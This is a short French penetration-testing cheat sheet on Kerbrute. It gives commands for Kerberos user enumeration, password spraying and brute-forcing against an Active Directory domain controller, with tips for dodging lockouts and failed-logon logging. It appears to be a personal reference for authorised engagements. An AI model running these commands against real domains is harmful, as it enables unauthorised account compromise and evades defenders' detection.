---
titre: "Kerbrute"
tags: [Outils, AD, kerberos, enumeration, spraying]
source: https://github.com/ropnop/kerbrute
---

# Kerbrute

**Énumération d'utilisateurs et password spraying via Kerberos** (pré-auth AS-REQ).
Rapide et **discret** : l'énumération d'utilisateurs valides ne génère **pas** de
log d'échec de logon classique (Event 4625).

> ⚠️ Uniquement en engagement/lab autorisé. Cf. `README`.

## Installation
```bash
# binaire pré-compilé depuis les releases GitHub, ou :
go install github.com/ropnop/kerbrute@latest
```

## Utilisation
```bash
# 1) valider quels usernames existent
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt

# 2) password spraying (1 mdp sur tous les users)
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Autumn2025!'

# 3) brute-force d'un compte précis
kerbrute bruteuser -d domain.local --dc 10.10.10.10 passwords.txt admin
```

## Réflexe
Commencer par `userenum` (liste de prénoms/noms → [[SecLists]]) pour obtenir des
comptes valides, **puis** un spraying **prudent** (1 essai/compte pour éviter le
lockout). Comptes trouvés → [[BloodHound]] / [[NetExec]].
